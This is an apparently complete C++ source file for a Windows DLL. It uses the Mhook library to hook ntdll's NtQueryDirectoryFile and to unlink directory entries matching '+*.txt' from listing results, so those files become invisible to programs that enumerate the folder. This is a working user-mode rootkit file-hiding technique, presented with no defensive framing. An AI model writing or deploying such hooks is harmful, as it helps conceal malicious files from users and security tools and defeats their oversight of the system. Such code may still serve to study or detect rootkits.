#include "pch.h"
#include "Hooker.h"

//Allow calls to the Mhook library-------------------------
#include <mhook.h> 
#if _WIN64
#pragma comment(lib, "mhook")
#else
#pragma comment(lib, "mhook_32")
#endif
//-----------------------------------------------------------
#define STATUS_SUCCESS   ((NTSTATUS)0x00000000L)

// Getting the necessary address of the NtQueryDirectoryFile function.
typedef NTSTATUS(WINAPI* _NtQueryDirectoryFile)(
    IN           HANDLE                 FileHandle,
    IN OUT       HANDLE                 Event,
    IN OPTIONAL  PIO_APC_ROUTINE        ApcRoutine,
    IN OPTIONAL  PVOID                  ApcContext,
    OUT          PIO_STATUS_BLOCK       IoStatusBlock,
    OUT          PVOID                  FileInformation,
    IN           ULONG                  Length,
    IN           FILE_INFORMATION_CLASS FileInformationClass,
    IN           BOOLEAN                ReturnSingleEntry,
    IN OPTIONAL  PUNICODE_STRING        FileName,
    IN           BOOLEAN                RestartScan
    );

// Special data structures for managing NtQueryDirectoryFile.
#define FileIdBothDirectoryInformation 37

typedef struct _FILE_ID_BOTH_DIR_INFORMATION
{
    ULONG         NextEntryOffset;
    ULONG         FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG         FileAttributes;
    ULONG         FileNameLength;
    ULONG         EaSize;
    CCHAR         ShortNameLength;
    WCHAR         ShortName[12];
    LARGE_INTEGER FileId;
    WCHAR         FileName[1];
} FILE_ID_BOTH_DIR_INFORMATION, * PFILE_ID_BOTH_DIR_INFORMATION;

const _NtQueryDirectoryFile TrueNtQueryDirectoryFile = (_NtQueryDirectoryFile)GetProcAddress(GetModuleHandleW(L"ntdll"), "NtQueryDirectoryFile");

NTSTATUS WINAPI HookNtQueryDirectoryFile(
    IN           HANDLE                 FileHandle,
    IN OUT       HANDLE                 Event,
    IN OPTIONAL  PIO_APC_ROUTINE        ApcRoutine,
    IN OPTIONAL  PVOID                  ApcContext,
    OUT          PIO_STATUS_BLOCK       IoStatusBlock,
    OUT          PVOID                  FileInformation,
    IN           ULONG                  Length,
    IN           FILE_INFORMATION_CLASS FileInformationClass,
    IN           BOOLEAN                ReturnSingleEntry,
    IN OPTIONAL  PUNICODE_STRING        FileName,
    IN           BOOLEAN                RestartScan)
{
    NTSTATUS status = TrueNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation,
        Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);

    if (FileIdBothDirectoryInformation == FileInformationClass && STATUS_SUCCESS == status)
    {
        PFILE_ID_BOTH_DIR_INFORMATION pCurrent = nullptr;
        PFILE_ID_BOTH_DIR_INFORMATION pNext = reinterpret_cast<PFILE_ID_BOTH_DIR_INFORMATION>(FileInformation);

        do
        {
            pCurrent = pNext;
            pNext = reinterpret_cast<PFILE_ID_BOTH_DIR_INFORMATION>((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
            const std::wstring fileName = std::wstring(pNext->FileName, pNext->FileNameLength / sizeof(wchar_t));

            // Hiding all files in the directory that match with pattern "+*.txt".
            if (!fileName.empty() && PathMatchSpecW(fileName.c_str(), L"+*.txt"))
            {
                if (0 == pNext->NextEntryOffset)
                {
                    pCurrent->NextEntryOffset = 0;
                }
                else
                {
                    pCurrent->NextEntryOffset += pNext->NextEntryOffset;
                }
                pNext = pCurrent;
            }

        } while (pCurrent->NextEntryOffset != 0);
    }
    return status;
}

BOOL HookFunction()
{
    // Set hook for the NtQueryDirectoryFile function.
    return Mhook_SetHook((PVOID*)&TrueNtQueryDirectoryFile, HookNtQueryDirectoryFile);
}

BOOL UnhookFunction()
{
    // Unhook the NtQueryDirectoryFile function.
    return Mhook_Unhook((PVOID*)&TrueNtQueryDirectoryFile);
}
